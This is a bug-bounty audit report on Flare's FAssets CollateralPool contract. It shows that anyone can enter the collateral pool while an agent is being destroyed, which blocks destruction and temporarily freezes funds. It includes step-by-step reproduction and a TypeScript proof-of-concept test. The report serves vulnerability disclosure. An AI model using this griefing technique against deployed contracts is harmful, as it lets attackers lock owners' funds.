# #46681 \[SC-Low] malicious actor can prevent agent from being destroyed

**Submitted on Jun 3rd 2025 at 10:26:30 UTC by @rick137 for** [**Audit Comp | Flare | FAssets**](https://immunefi.com/audit-competition/audit-comp-flare-fassets)

* **Report ID:** #46681
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/implementation/CollateralPool.sol>
* **Impacts:**
  * Temporary freezing of funds

## Description

## Brief/Intro

Entering into `collateral Pool` is possible even agent's status is `DESTROYING` leading to the temporary freezing of funds

## Vulnerability Details

```
0- agent is created by owner
1- collaterals is deposited to agentPool and collateralPool to make agent available
2- agent becomes not available by owner for any reason
3- announceDestroy is emitted by agent's owner
4- announceAgentPoolTokenRedemption is emitted by owner
5-collateral is redeemed by owner
6- Malicious actor sees the opportunity and deposits into the collateralPool to prevent the agent from being destroyed
7- destroyAgent transaction is reverted because cannot destroy a pool with issued tokens
8- malicious actor can redeem his/her CPTs anytime
```

## Impact Details

temporary freezing of funds

## Proof of Concept

## Proof of Concept

consider to add this test to `14-CoreVault.ts`

```typescript
    it.only("prevent-agent-destroying", async() => {
        const usdcCollateral = context.collaterals.find(c => c.token === context.usdc.address)!;
        const poolCollateral = context.collaterals.find(c => c.token === context.wNat.address)!;
        const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1, {
            vaultCollateralToken: usdcCollateral.token,
            mintingVaultCollateralRatioBIPS: usdcCollateral.minCollateralRatioBIPS,
            mintingPoolCollateralRatioBIPS: poolCollateral.minCollateralRatioBIPS,
        });
        const minter = await Minter.createTest(context, minterAddress1, underlyingMinter1, context.underlyingAmount(100000000000000));


        // 1- collaterals is deposited to agentPool and collateralPool and the agent becomes available
        await agent.depositCollateralLotsAndMakeAvailable(10);
        // 2- agent becomes not available by owner for any reason
        await agent.exitAvailable(true);

        await deterministicTimeIncrease(7200);

        // 3- announceDestroy is emitted by agent's owner
        await context.assetManager.announceDestroyAgent(agent.vaultAddress, { from: agent.ownerWorkAddress });


        let bal = await agent.collateralPoolToken.balanceOf(agent.vaultAddress);

        let agentInfo = await agent.getAgentInfo();
        const tokens = agentInfo.totalAgentPoolTokensWei;
        // 4- announceAgentPoolTokenRedemption is emitted by owner
        await context.assetManager.announceAgentPoolTokenRedemption(agent.agentVault.address, tokens, { from: agentOwner1 });
        await deterministicTimeIncrease((await context.assetManager.getSettings()).withdrawalWaitMinSeconds);

        // 5-collateral is redeemed by owner
        await agent.agentVault.redeemCollateralPoolTokens(bal, agent.ownerWorkAddress , { from: agent.ownerWorkAddress });

        let total = await agent.collateralPoolToken.totalSupply();
        assertWeb3Equal(total, 0);
        agentInfo = await agent.getAgentInfo();
        assertWeb3Equal(agentInfo.status, 4);//agent's status is DESTROYING
        // 6- Malicious actor sees the opportunity and deposits into the collateralPool to prevent the agent from being destroyed
        await agent.collateralPool.enter(0, false, {from: minterAddress1 ,value: toWei(1) });

        // 7- destroyAgent transaction is reverted because cannot destroy a pool with issued tokens
        await deterministicTimeIncrease(context.settings.withdrawalWaitMinSeconds);
        await expectRevert(context.assetManager.destroyAgent(agent.vaultAddress, agent.ownerWorkAddress, { from: agent.ownerWorkAddress }), "cannot destroy a pool with issued tokens");

        await deterministicTimeIncrease(3600);
        // 8- malicious actor can redeem his/her CPTs anytime
        let minterPoolTokenBalance = await agent.collateralPoolToken.balanceOf(minterAddress1);
        await agent.collateralPool.exit(minterPoolTokenBalance, 0, {from: minterAddress1});
    });
```
